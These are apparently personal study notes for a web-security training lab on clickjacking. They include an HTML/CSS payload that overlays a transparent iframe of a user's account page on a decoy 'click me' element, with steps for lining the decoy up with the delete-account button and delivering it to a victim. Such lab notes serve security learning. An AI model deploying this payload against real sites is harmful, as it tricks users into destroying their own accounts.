# Clickjacking Notes

## Methodology

Based on the HTML from the first lab you can create an iframe that displays over a users account page

## Labs walkthrough

### Basic clickjacking with CSRF token protection

- In the exploit server craft a payload like:

```
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

- we need to change our lab id, setting our height and width variables to fit correctly, recommended is to start with 700px and 500px
- then we need to adjust the top and side values so that the "test me" decoy action aligh with "delecte accounts" button, suggested start with 300px and 60px
- click store and view exploit to see if the iframe does place correctly, if not adjust the top and side values
- once correct change "test me" to "click me" and deliver to victim


